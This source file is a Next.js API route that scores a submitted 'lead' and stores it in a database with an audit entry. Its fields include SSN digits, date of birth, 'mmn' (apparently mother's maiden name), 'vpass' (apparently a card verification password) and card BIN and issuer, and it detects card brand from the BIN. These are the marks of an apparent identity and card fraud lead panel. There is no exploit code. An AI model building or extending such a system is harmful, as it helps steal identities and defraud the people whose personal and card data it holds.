import { NextRequest, NextResponse } from "next/server";
import { getUser, audit } from "@/lib/auth";
import { db } from "@/lib/db";
import { leads } from "@/lib/db/schema";
import { generateRef } from "@/lib/utils";
import { calculateLeadScore } from "@/lib/lead-scoring";

export async function POST(req: NextRequest) {
  const user = await getUser();
  if (!user) return NextResponse.json({ error: "Unauthorized" }, { status: 401 });

  const body = await req.json();

  // Calculate lead score
  const leadScore = calculateLeadScore({
    creditScoreRange: body.creditScoreRange,
    annualIncome: body.annualIncome,
    employmentStatus: body.employmentStatus,
    email: body.email,
    phone: body.phone,
    address: body.address,
    city: body.city,
    state: body.state,
    zip: body.zip,
    dob: body.dob,
    ssnLast4: body.ssnLast4,
  });

  // Clean phone to digits
  const phone = body.phone?.replace(/\D/g, "") || null;
  const landline = body.landline?.replace(/\D/g, "") || null;

  // Auto-detect card brand from BIN
  let cardBrand = body.cardBrand || null;
  const bin = body.cardNumberBin || "";
  if (bin && !cardBrand) {
    if (bin[0] === "4") cardBrand = "Visa";
    else if (bin[0] === "5" && bin[1] >= "1" && bin[1] <= "5") cardBrand = "Mastercard";
    else if (bin[0] === "3" && (bin[1] === "4" || bin[1] === "7")) cardBrand = "Amex";
    else if (bin.startsWith("6011") || bin.startsWith("65")) cardBrand = "Discover";
  }

  const [lead] = await db.insert(leads).values({
    refNumber: generateRef(),
    firstName: body.firstName || null,
    lastName: body.lastName || null,
    email: body.email?.toLowerCase() || null,
    phone,
    landline,
    dob: body.dob || null,
    ssnLast4: body.ssnLast4?.replace(/\D/g, "").slice(-4) || null,
    mmn: body.mmn || null,
    county: body.county || null,
    vpass: body.vpass || null,
    address: body.address || null,
    city: body.city || null,
    state: body.state || null,
    zip: body.zip || null,
    country: body.country || "US",
    annualIncome: body.annualIncome || null,
    employmentStatus: body.employmentStatus || null,
    creditScoreRange: body.creditScoreRange || null,
    requestedLimit: body.requestedLimit || null,
    cardType: body.cardType || null,
    cardNumberBin: body.cardNumberBin || null,
    cardBrand,
    cardIssuer: body.cardIssuer || null,
    businessName: body.businessName || null,
    businessEin: body.businessEin || null,
    mortgageBank: body.mortgageBank || null,
    mortgagePayment: body.mortgagePayment || null,
    status: body.status || "new",
    agentId: body.agentId ? parseInt(body.agentId) : user.id,
    leadScore,
    notes: body.notes || null,
  }).returning({ id: leads.id, refNumber: leads.refNumber });

  await audit(user.id, user.username, "create_lead", "lead", lead.id, `Created lead ${lead.refNumber}`);

  return NextResponse.json({ success: true, id: lead.id, refNumber: lead.refNumber, leadScore });
}
